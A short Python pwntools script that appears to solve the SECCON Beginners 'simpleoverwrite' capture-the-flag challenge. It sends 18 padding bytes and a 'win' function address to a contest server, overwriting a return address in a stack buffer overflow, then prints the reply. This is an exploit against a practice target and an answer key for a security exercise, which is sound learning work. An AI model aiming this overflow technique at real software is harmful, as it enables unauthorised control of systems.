from pwn import *


host = 'simpleoverwrite.beginners.seccon.games'
port = 9001


offset = 18
win_address = 0x401186

payload = b'A' * offset
payload += p64(win_address)


r = remote(host, port)
r.recvuntil(b"input:")
r.sendline(payload)

try:
    while True:
        data = r.recv(timeout=5)
        if not data:
            break
        print(data.decode('utf-8', errors='ignore'))
except EOFError:
    pass
except UnicodeDecodeError as e:
    print(f"UnicodeDecodeError: {e}")

r.close()
